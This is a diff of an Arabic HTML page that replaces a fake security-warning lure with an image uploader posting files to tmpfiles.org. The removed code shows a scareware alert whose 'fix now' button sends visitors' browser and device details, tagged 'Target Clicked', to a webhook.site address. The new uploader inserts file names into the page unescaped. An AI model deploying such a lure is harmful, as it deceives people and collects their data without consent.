@@ -1,49 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>System Warning</title>
-    <style>
-        body { background-color: black; color: red; text-align: center; font-family: Arial, sans-serif; padding-top: 100px; }
-        .warning-box { border: 2px solid red; display: inline-block; padding: 20px; border-radius: 10px; }
-        button { background-color: red; color: white; padding: 15px 30px; font-size: 20px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
-        button:hover { background-color: darkred; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>محول الصور الدائم - ZORIX</title>
+<style>
+body{font-family:Arial;text-align:center;padding:20px;background:#0f0f0f;color:white}
+.box{background:#1e1e1e;padding:20px;border-radius:10px;max-width:450px;margin:auto;border:1px solid #333}
+button{background:#00ff88;color:black;border:none;padding:12px 25px;border-radius:5px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
+#links{margin-top:15px;text-align:left;direction:ltr;word-break:break-all}
+a{color:#00ff88}
+img{max-width:100%;border-radius:8px;margin-top:10px;border:1px solid #333}
+</style>
 </head>
 <body>
+<div class="box">
+<h2>محول الصور - ZORIX v2</h2>
+<p>اختار الصور من جهازك</p>
+<input type="file" id="myImages" multiple accept="image/*" style="width:100%"><br><br>
+<button onclick="uploadImages()">رفع الصور</button>
+<p id="status"></p>
+<div id="links"></div>
+</div>
 
-    <div class="warning-box">
-        <h1>⚠️ تحذير أمني ⚠️</h1>
-        <p>تم اكتشاف نشاط مشبوه في جهازك. يرجى الضغط على الزر أدناه لإصلاح الخلل فوراً.</p>
-        <button onclick="sendData()">موافق / إصلاح الآن</button>
-    </div>
-
-    <script>
-        function sendData() {
-            // رابط الـ Webhook الخاص بك لاستقبال البيانات
-            const webhookUrl = "https://webhook.site/7ca94175-3600-4d49-9f32-b13d51122dfd";
-            
-            const data = {
-                event: "Target Clicked",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: window.screen.width + "x" + window.screen.height,
-                time: new Date().toISOString()
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'no-cors', 
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                alert("جاري معالجة الطلب... يرجى الانتظار");
-                window.location.href = "https://google.com"; 
-            }).catch(err => {
-                alert("حدث خطأ في الاتصال");
-            });
-        }
-    </script>
+<script>
+async function uploadImages(){
+ const input=document.getElementById('myImages');
+ const status=document.getElementById('status');
+ const linksDiv=document.getElementById('links');
+ if(input.files.length==0){status.innerText="اختار صورة الأول";return;}
+ status.innerText="جاري الرفع... ⏳";
+ linksDiv.innerHTML="";
+ for(let file of input.files){
+   const form=new FormData();
+   form.append('file',file);
+   try{
+     const res=await fetch('https://tmpfiles.org/api/v1/upload',{method:'POST',body:form});
+     const data=await res.json();
+     if(data.status=='success'){
+       let url=data.data.url;
+       let directUrl=url.replace('tmpfiles.org/','tmpfiles.org/dl/');
+       status.innerText="✅ تم الرفع بنجاح!";
+       linksDiv.innerHTML+=`<div style="background:#2a2a2a;padding:10px;border-radius:5px;margin-bottom:10px">
+       📸 ${file.name}<br>
+       <a href="${directUrl}" target="_blank">${directUrl}</a><br>
+       <img src="${directUrl}">
+       </div>`;
+     }
+   }catch(e){
+     status.innerText="❌ خطأ: "+e.message;
+   }
+ }
+}
+</script>
 </body>
 </html>
